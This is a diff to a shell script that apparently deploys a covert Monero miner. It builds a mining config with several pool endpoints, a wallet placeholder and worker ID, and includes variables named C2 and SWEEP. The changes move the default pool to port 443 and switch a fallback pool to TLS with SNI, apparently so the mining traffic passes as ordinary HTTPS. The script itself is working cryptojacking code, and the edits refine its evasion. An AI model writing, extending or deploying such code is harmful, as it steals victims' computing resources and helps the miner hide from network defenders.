@@ -14,7 +14,7 @@ C2="${1:-}"
 WID="${2:-x}"
 CP2="${KF_CP2:-$C2}"
 NICE="${KF_NICE:-19}"
-POOL="${KF_POOL:-gulf.moneroocean.stream:20004}"
+POOL="${KF_POOL:-gulf.moneroocean.stream:443}"
 WALLET="${KF_WALLET:-}"
 SWEEP="${KF_SWEEP:-1}"
 
@@ -103,8 +103,8 @@ if [ ! -s "$D/c.json" ]; then
   "pools": [
     { "algo": null, "coin": "monero", "url": "$POOL", "user": "$WALLET.$WID", "pass": "x",
       "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": true },
-    { "algo": null, "coin": "monero", "url": "gulf.moneroocean.stream:10004", "user": "$WALLET.$WID", "pass": "x",
-      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
+    { "algo": "rx/0", "coin": "monero", "url": "gulf.moneroocean.stream:20004", "user": "$WALLET.$WID", "pass": "x",
+      "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": true, "sni": true },
     { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:443", "user": "$WALLET.$WID", "pass": "x",
       "rig-id": "$WID", "keepalive": true, "enabled": true, "tls": false },
     { "algo": "rx/0", "coin": "monero", "url": "mine.c3pool.com:33333", "user": "$WALLET.$WID", "pass": "x",
